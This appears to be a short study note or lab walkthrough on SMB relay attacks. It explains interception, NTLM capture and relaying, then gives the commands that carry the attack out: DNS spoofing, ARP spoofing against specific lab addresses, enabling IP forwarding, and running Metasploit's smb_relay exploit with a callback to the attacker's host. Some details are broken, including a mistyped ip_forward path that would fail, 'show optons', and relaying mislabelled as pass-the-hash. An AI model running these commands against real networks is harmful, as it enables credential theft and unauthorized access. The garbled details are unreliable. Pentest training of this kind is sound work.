
An SMB relay attack is a type of network attack where an attacker intercepts SMB traffic, manipulates it, and relays it to a legitimate server to gain unauthorized access to resources or perform malicious actions.

This type of attack is common in Windows networks, where SMB is used for file sharing, printer sharing, and other network services.



#### How Attack works
**Interception**: The attacker sets up a man-in-the-middle positions between the client and the server. This can be done using various techniques such as `ARP spoofing`, `DNS poisoning` or `setting up a rogue SMB server`

**Capturing Authentication**: When a client connects to a legitimate server via 
SMB, it sends authentication data. The attacker captures this data, which might include NTLM (NT LAN Manager) hashes. #paassTheHash attack

**Relaying to a legitimate Server**: Instead of decrypting the captured NTLM hash, the attacker relays it to another server that trusts the source. This allows the attacker to impersonate the user whose hash was captured.

**Gain access**: Might include `sensitive files`, `databases` or `administrative privileges`. this access could lead to further `lateral movement` within hte network, compromising additional systems. 



### Attacking part:



```
echo "<attacker_ip> *.sportsfoo.com" > dns
```

```
dnsspoof -i eth1 -f dns 
```

ARP spoof attack
```
echo 1 > /proc/sys/net/1pv4/ip_forward
```

```
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
```

```
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```

###### Start metasploit
```
msfconsole -q 
search smb_relay
use exploit/windows/smb/smb_relay
show optons
set srvhost <attacker_ip>
set lhost <attacker_ip>
set smbhost <client_system_ip>
run
```


